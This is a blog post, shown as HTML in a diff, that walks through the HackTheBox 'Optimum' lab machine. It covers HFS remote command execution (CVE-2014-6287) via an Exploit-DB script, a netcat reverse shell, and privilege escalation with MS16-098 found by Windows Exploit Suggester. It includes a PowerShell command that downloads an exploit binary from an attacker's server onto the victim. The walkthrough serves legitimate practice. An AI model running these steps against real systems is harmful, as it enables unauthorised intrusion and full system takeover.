@@ -1,0 +1,355 @@
+<!doctype html>
+<html>
+
+<head>
+
+  <title>
+    
+      HackTheBox Walkthrough - Optimum | Emmet Friel
+    
+  </title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="utf-8">
+
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <link rel="stylesheet" href="/assets/css/syntax.css">
+  <!-- Use Atom -->
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Emmet Friel" />
+  <!-- Use RSS-2.0 -->
+  <!--<link href="/rss-feed.xml" type="application/rss+xml" rel="alternate" title="Emmet Friel | cyber security blog"/>
+  //-->
+
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Serif:400,400italic,700%7CPT+Sans:400">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Quattrocento+Sans">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+  <script type="text/javascript" async
+    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+    MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        }
+      });
+  </script>
+
+  <!-- Google Analytics -->
+  <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', '', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <!-- Use Jekyll SEO plugin -->
+  <!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>HackTheBox Walkthrough - Optimum | Emmet Friel</title>
+<meta name="generator" content="Jekyll v3.6.3" />
+<meta property="og:title" content="HackTheBox Walkthrough - Optimum" />
+<meta name="author" content="Emmet Friel" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction" />
+<meta property="og:description" content="Introduction" />
+<link rel="canonical" href="http://localhost:4000/hackthebox/hackthebox-optimum.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/hackthebox-optimum.html" />
+<meta property="og:site_name" content="Emmet Friel" />
+<meta property="og:image" content="http://localhost:4000/htb/optimum/optimum.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-04-07T00:00:00+01:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","url":"http://localhost:4000/hackthebox/hackthebox-optimum.html","headline":"HackTheBox Walkthrough - Optimum","dateModified":"2020-04-07T00:00:00+01:00","datePublished":"2020-04-07T00:00:00+01:00","image":"http://localhost:4000/htb/optimum/optimum.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/hackthebox-optimum.html"},"author":{"@type":"Person","name":"Emmet Friel"},"description":"Introduction","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+</head>
+
+
+<body>
+
+  <div class="container">
+    <header class="masthead">
+  <h3 class="masthead-title">
+    <a href="/">Emmet Friel</a>
+    <small class="masthead-subtitle">cyber security blog</small>
+    <div class="menu">
+  <nav class="menu-content">
+    
+      <a href="/menu/about.html">About</a>
+    
+      <a href="/menu/projects.html">Projects</a>
+    
+      <a href="/menu/news.html">News</a>
+    
+      <a href="/menu/contact.html">Contact</a>
+    
+  </nav>
+  <nav class="social-icons">
+    
+  
+  
+    <a href="https://www.github.com/efriel94" target="_blank"><i class="fa fa-github" aria-hidden="true"></i></a>
+  
+
+  
+  
+    <a href="https://twitter.com/friel_emmet" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a>
+  
+
+  
+  
+    <a href="http://www.linkedin.com/in/efrielcsit2894/" target="_blank"><i class="fa fa-linkedin" aria-hidden="true"></i></a>
+  
+
+  
+  
+    <a href="/feed.xml"><i class="fa fa-rss-square" aria-hidden="true"></i></a>
+  
+
+  </nav>
+</div>
+
+  </h3>
+</header>
+
+
+    <div class="post-container">
+      <h1>
+  HackTheBox Walkthrough - Optimum
+</h1>
+
+
+  <img src="/assets/img/htb/optimum/optimum.png">
+
+
+<h1 id="introduction">Introduction</h1>
+
+<p>This box was interesting in the sense it really honed in on the importance of enumeration, gave me a solid foundation on windows privilege escalation that I can refer back to and that you can’t rely on the exploit tools to do all the work for you! Lets get started.</p>
+
+<h1 id="reconnaissance--enumeration">Reconnaissance &amp; Enumeration</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-O</span> <span class="nt">-p-</span> <span class="nt">-oN</span> nmap.nmap 10.10.10.8
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-04-07 10:53 BST
+Nmap scan report <span class="k">for </span>10.10.10.8
+Host is up <span class="o">(</span>0.029s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65534 filtered ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    HttpFileServer httpd 2.3
+|_http-server-header: HFS 2.3
+|_http-title: HFS /
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Microsoft Windows Server 2012 <span class="o">(</span>91%<span class="o">)</span>, Microsoft Windows Server 2012 or Windows Server 2012 R2 <span class="o">(</span>91%<span class="o">)</span>, Microsoft Windows Server 2012 R2 <span class="o">(</span>91%<span class="o">)</span>, Microsoft Windows 7 Professional <span class="o">(</span>87%<span class="o">)</span>, Microsoft Windows Phone 7.5 or 8.0 <span class="o">(</span>86%<span class="o">)</span>, Microsoft Windows 7 or Windows Server 2008 R2 <span class="o">(</span>85%<span class="o">)</span>, Microsoft Windows Server 2008 R2 <span class="o">(</span>85%<span class="o">)</span>, Microsoft Windows Server 2008 R2 or Windows 8.1 <span class="o">(</span>85%<span class="o">)</span>, Microsoft Windows Server 2008 R2 SP1 or Windows 8 <span class="o">(</span>85%<span class="o">)</span>, Microsoft Windows Server 2016 <span class="o">(</span>85%<span class="o">)</span>
+No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>128.40 seconds
+</code></pre></div></div>
+<ul>
+  <li>-sC : scripting scan, equivalent to also writing –script=default</li>
+  <li>-sV: service version</li>
+  <li>-O  : Operating System version</li>
+  <li>-p- : scanning all 65536 ports</li>
+  <li>-oN: Output result to a normal text file called nmap.nmap</li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><img src="/assets/img/htb/optimum/hfs_opt.png" alt="image" /></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center"><em>HFS Webpage running on port 80</em></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Any webpage running on port 80 I always perform a dirb and nikto scan in the background, so I did just that however a quick search on the service version gave me everything I needed to get access into the system.</p>
+
+<p>The exploit I used was: <a href="https://www.exploit-db.com/exploits/39161" target="_blank_">Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)</a> which refers to CVE-2014-6287. The vulnerability is</p>
+<blockquote>
+  <p>“The findMacroMarker function in parserLib.pas in Rejetto HTTP File Server (aks HFS or HttpFileServer) 2.3x before 2.3c allows remote attackers to execute arbitrary programs via a %00 sequence in a search action.” In other words, using the search bar on the website we can execute code server side using the null sequence.</p>
+</blockquote>
+
+<p>There are now two approaches to exploit the machine:</p>
+<ol>
+  <li>Execute commands in the search bar on the website using the null byte (%00)</li>
+  <li>Use the exploit script we found through a quick search.</li>
+</ol>
+
+<p>For simplicity, I am going to use the scripting option.</p>
+
+<h1 id="shell-access">Shell Access</h1>
+
+<p>To use the script there are 3 important variables:</p>
+
+<ol>
+  <li>Change the IP address to your own:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ip_addr <span class="o">=</span> <span class="s2">"192.168.44.128"</span> <span class="c">#local IP address</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Change the port which you are going to listen on:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> local_port <span class="o">=</span> <span class="s2">"443"</span> <span class="c"># Local Port number</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Host a webserver serving netcat (nc.exe). I am using SecLists GitHub repo for nc.exe which you can clone from their GitHub page.
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#EDB Note: You need to be using a web server hosting netcat (http://&lt;attackers_ip&gt;:80/nc.exe).  </span>
+<span class="c">#          You may need to run it multiple times for success!</span>
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<p>Once I edited the script, I setup my netcat listener, python webserver and then executed the script: <code class="highlighter-rouge">python 39161.py &lt;target IP&gt; &lt;target port&gt;</code> 
+Note that it may take a few attempts for the script to work.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><img src="/assets/img/htb/optimum/opt_terminal.png" alt="image" /></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center"><em>Running the attack and having a reverse shell access to the victim machine</em></td>
+    </tr>
+  </tbody>
+</table>
+
+<h1 id="privilege-escalation-using-windows-suggester">Privilege Escalation using Windows Suggester</h1>
+
+<p>You can see I am user “kostas” from the terminal. I do not have Admin permissions so it’s time to escalate to root! To do this I used the <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank_">Windows Exploit Suggester</a> tool. The tool is really simple and extremely powerful, it compares all the patches on the machine to Microsoft’s patch database and outputs a “suggested” list of exploits. I have seen older tutorials use “Sherlock” instead of “Windows Suggester” but if you have a look at Sherlock’s GitHub, the repo hasn’t been updated in 3 years :\</p>
+
+<p>To do this, run <code class="highlighter-rouge">systeminfo</code> and then copy and paste the output to a file: <code class="highlighter-rouge">systeminfo.txt</code> in my case</p>
+
+<pre><code class="language-windows">C:\Users\kostas\Desktop&gt;systeminfo
+</code></pre>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Documents/boxes/optimum# python windows-exploit-suggester.py <span class="nt">--update</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> initiating winsploit version 3.3...
+<span class="o">[</span>+] writing to file 2020-04-07-mssb.xls
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="k">done</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Documents/boxes/optimum# python windows-exploit-suggester.py <span class="nt">--database</span> 2020-04-07-mssb.xls <span class="nt">--systeminfo</span> systeminfo.txt <span class="nt">--quiet</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> initiating winsploit version 3.3...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> database file detected as xls or xlsx based on extension
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> attempting to <span class="nb">read </span>from the systeminfo input file
+<span class="o">[</span>+] systeminfo input file <span class="nb">read </span>successfully <span class="o">(</span>ascii<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> querying database file <span class="k">for </span>potential vulnerabilities
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> comparing the 32 hotfix<span class="o">(</span>es<span class="o">)</span> against the 266 potential bulletins<span class="o">(</span>s<span class="o">)</span> with a database of 137 known exploits
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> there are now 246 remaining vulns
+<span class="o">[</span>+] <span class="o">[</span>E] exploitdb PoC, <span class="o">[</span>M] Metasploit module, <span class="o">[</span><span class="k">*</span><span class="o">]</span> missing bulletin
+<span class="o">[</span>+] windows version identified as <span class="s1">'Windows 2012 R2 64-bit'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 
+<span class="o">[</span>E] MS16-135: Security Update <span class="k">for </span>Windows Kernel-Mode Drivers <span class="o">(</span>3199135<span class="o">)</span> - Important
+<span class="o">[</span>E] MS16-098: Security Update <span class="k">for </span>Windows Kernel-Mode Drivers <span class="o">(</span>3178466<span class="o">)</span> - Important
+<span class="o">[</span>M] MS16-075: Security Update <span class="k">for </span>Windows SMB Server <span class="o">(</span>3164038<span class="o">)</span> - Important
+<span class="o">[</span>E] MS16-074: Security Update <span class="k">for </span>Microsoft Graphics Component <span class="o">(</span>3164036<span class="o">)</span> - Important
+<span class="o">[</span>E] MS16-063: Cumulative Security Update <span class="k">for </span>Internet Explorer <span class="o">(</span>3163649<span class="o">)</span> - Critical
+<span class="o">[</span>E] MS16-032: Security Update <span class="k">for </span>Secondary Logon to Address Elevation of Privile <span class="o">(</span>3143141<span class="o">)</span> - Important
+<span class="o">[</span>M] MS16-016: Security Update <span class="k">for </span>WebDAV to Address Elevation of Privilege <span class="o">(</span>3136041<span class="o">)</span> - Important
+<span class="o">[</span>E] MS16-014: Security Update <span class="k">for </span>Microsoft Windows to Address Remote Code Execution <span class="o">(</span>3134228<span class="o">)</span> - Important
+<span class="o">[</span>E] MS16-007: Security Update <span class="k">for </span>Microsoft Windows to Address Remote Code Execution <span class="o">(</span>3124901<span class="o">)</span> - Important
+<span class="o">[</span>E] MS15-132: Security Update <span class="k">for </span>Microsoft Windows to Address Remote Code Execution <span class="o">(</span>3116162<span class="o">)</span> - Important
+<span class="o">[</span>E] MS15-112: Cumulative Security Update <span class="k">for </span>Internet Explorer <span class="o">(</span>3104517<span class="o">)</span> - Critical
+<span class="o">[</span>E] MS15-111: Security Update <span class="k">for </span>Windows Kernel to Address Elevation of Privilege <span class="o">(</span>3096447<span class="o">)</span> - Important
+<span class="o">[</span>E] MS15-102: Vulnerabilities <span class="k">in </span>Windows Task Management Could Allow Elevation of Privilege <span class="o">(</span>3089657<span class="o">)</span> - Important
+<span class="o">[</span>E] MS15-097: Vulnerabilities <span class="k">in </span>Microsoft Graphics Component Could Allow Remote Code Execution <span class="o">(</span>3089656<span class="o">)</span> - Critical
+<span class="o">[</span>M] MS15-078: Vulnerability <span class="k">in </span>Microsoft Font Driver Could Allow Remote Code Execution <span class="o">(</span>3079904<span class="o">)</span> - Critical
+<span class="o">[</span>E] MS15-052: Vulnerability <span class="k">in </span>Windows Kernel Could Allow Security Feature Bypass <span class="o">(</span>3050514<span class="o">)</span> - Important
+<span class="o">[</span>M] MS15-051: Vulnerabilities <span class="k">in </span>Windows Kernel-Mode Drivers Could Allow Elevation of Privilege <span class="o">(</span>3057191<span class="o">)</span> - Important
+<span class="o">[</span>E] MS15-010: Vulnerabilities <span class="k">in </span>Windows Kernel-Mode Driver Could Allow Remote Code Execution <span class="o">(</span>3036220<span class="o">)</span> - Critical
+<span class="o">[</span>E] MS15-001: Vulnerability <span class="k">in </span>Windows Application Compatibility Cache Could Allow Elevation of Privilege <span class="o">(</span>3023266<span class="o">)</span> - Important
+<span class="o">[</span>E] MS14-068: Vulnerability <span class="k">in </span>Kerberos Could Allow Elevation of Privilege <span class="o">(</span>3011780<span class="o">)</span> - Critical
+<span class="o">[</span>M] MS14-064: Vulnerabilities <span class="k">in </span>Windows OLE Could Allow Remote Code Execution <span class="o">(</span>3011443<span class="o">)</span> - Critical
+<span class="o">[</span>M] MS14-060: Vulnerability <span class="k">in </span>Windows OLE Could Allow Remote Code Execution <span class="o">(</span>3000869<span class="o">)</span> - Important
+<span class="o">[</span>M] MS14-058: Vulnerabilities <span class="k">in </span>Kernel-Mode Driver Could Allow Remote Code Execution <span class="o">(</span>3000061<span class="o">)</span> - Critical
+<span class="o">[</span>E] MS13-101: Vulnerabilities <span class="k">in </span>Windows Kernel-Mode Drivers Could Allow Elevation of Privilege <span class="o">(</span>2880430<span class="o">)</span> - Important
+<span class="o">[</span>M] MS13-090: Cumulative Security Update of ActiveX Kill Bits <span class="o">(</span>2900986<span class="o">)</span> – Critical
+</code></pre></div></div>
+
+<p>The output of windows-exploit-suggester shows a grand collection of exploits to try out so at this stage it’s really trial and error. Note that some attempts caused the machine to crash and so you would have to set up the reverse shell again, nothing major.
+After trial and error, MS16-098 got me that nice root shell :)</p>
+
+<p>I placed the exploit on the python webserver, downloaded it from the victims machine and then executed it.</p>
+
+<pre><code class="language-windows">C:\Users\kostas\Desktop&gt;powershell.exe -c "(New-Object System.Net.WebClient).DownloadFile('http://10.X.X.X/bfill.exe','C:\Users\kostas\Desktop\exploit.exe')
+</code></pre>
+
+<pre><code class="language-windows">C:\Users\kostas\Desktop&gt;exploit.exe
+exploit.exe
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved. 
+
+C:\Users\kostas\Desktop&gt;whoami
+whoami
+nt authority\system
+</code></pre>
+
+
+<span class="post-date">
+  Written on
+  
+  April
+  7th,
+  2020
+  by
+  
+    Emmet Friel
+  
+</span>
+
+<div class="post-date">Feel free to share!</div>
+  <div class="sharing-icons">
+    <a href="https://twitter.com/intent/tweet?text=HackTheBox Walkthrough - Optimum&amp;url=/hackthebox/hackthebox-optimum.html" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a>
+    <a href="https://www.facebook.com/sharer/sharer.php?u=/hackthebox/hackthebox-optimum.html&amp;title=HackTheBox Walkthrough - Optimum" target="_blank"><i class="fa fa-facebook" aria-hidden="true"></i></a>
+  </div>
+</div>
+
+
+<div class="related">
+  <h1 >You may also enjoy:</h1>
+  
+  <ul class="related-posts">
+    
+  </ul>
+</div>
+
+
+
+
+    </div>
+
+    <footer class="footer">
+  
+  
+  
+    <a href="https://www.github.com/efriel94" target="_blank"><i class="fa fa-github" aria-hidden="true"></i></a>
+  
+
+  
+  
+    <a href="https://twitter.com/friel_emmet" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a>
+  
+
+  
+  
+    <a href="http://www.linkedin.com/in/efrielcsit2894/" target="_blank"><i class="fa fa-linkedin" aria-hidden="true"></i></a>
+  
+
+  
+  
+    <a href="/feed.xml"><i class="fa fa-rss-square" aria-hidden="true"></i></a>
+  
+
+  <div class="post-date"><a href="/menu/about.html">Emmet Friel | cyber security blog by Emmet Friel</a></div>
+</footer>
+
+  </div>
+
+</body>
+</html>
